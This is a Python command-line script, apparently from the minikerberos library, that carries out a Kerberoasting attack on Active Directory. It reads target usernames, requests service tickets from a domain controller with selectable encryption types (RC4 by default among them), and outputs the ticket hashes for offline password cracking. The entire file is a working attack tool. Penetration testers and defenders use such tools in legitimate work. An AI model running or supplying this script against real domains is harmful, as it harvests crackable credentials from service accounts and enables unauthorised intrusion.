import logging
import asyncio
import traceback
import pathlib
from minikerberos.common.factory import KerberosClientFactory, kerberos_url_help_epilog
from minikerberos.security import kerberoast
from typing import List

async def spnroast(connection_url:str, users:List[str], domain:str = None, out_file:str = None, etypes:List[int] = [23,17,18]):
	try:
		results_ok = []
		results_err = []
		cu = KerberosClientFactory.from_url(connection_url)
		if isinstance(users, str):
			if pathlib.Path(users).exists():
				with open(users, 'r') as f:
					users = f.read().splitlines()
			else:
				users = [users]
		
		if isinstance(etypes, str):
			etypes = [int(x) for x in etypes.split(',')]
		if isinstance(etypes, int):
			etypes = [etypes]
		
		if domain is None:
			for username in users:
				if username.find('@') != -1:
					domain = username.split('@')[1]
					break
			else:
				domain = cu.get_creds().domain
		if domain is None:
			raise Exception('No domain specified')
		
		users_nodomain = []
		for username in users:
			if username.find('@') != -1:
				users_nodomain.append(username.split('@')[0])
			else:
				users_nodomain.append(username)
		
		async for username, res, err in kerberoast(cu, users_nodomain, domain, override_etype=etypes):
			if err is not None:
				results_err.append((username, err))
				continue
			results_ok.append((username, res))	

		if out_file is not None:
			with open(out_file, 'w', newline='') as f:
				for _, result in results_ok:
					f.write(result + '\r\n')
		
		for _, err in results_err:
			print('%s error: %s' % (username, err))
		for _, result in results_ok:
			print(result)
		
	except Exception as e:
		traceback.print_exc()

async def amain():
	import argparse
	
	parser = argparse.ArgumentParser(description='Kerberoast', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
	parser.add_argument('kerberos_connection_url', help='the kerberos target string in the following format kerberos+<stype>://<domain>\\<username>@<domaincontroller-ip>')
	parser.add_argument('domain', help='Realm. Use this if you specify username in "spn" field')
	parser.add_argument('users', nargs ='*', help='User/username to kerberoast. Can be a file with usernames, or a single username.')
	parser.add_argument('-e', '--etypes', default='23,17,18', help='Encryption types to use. Default: 23,17,18')
	parser.add_argument('-o', '--out-file', help='Write results to this file instead of printing them')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	
	args = parser.parse_args()
	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)
	
	await spnroast(args.kerberos_connection_url, args.users, args.domain, args.out_file, args.etypes)

def main():
	asyncio.run(amain())
	
if __name__ == '__main__':
	main()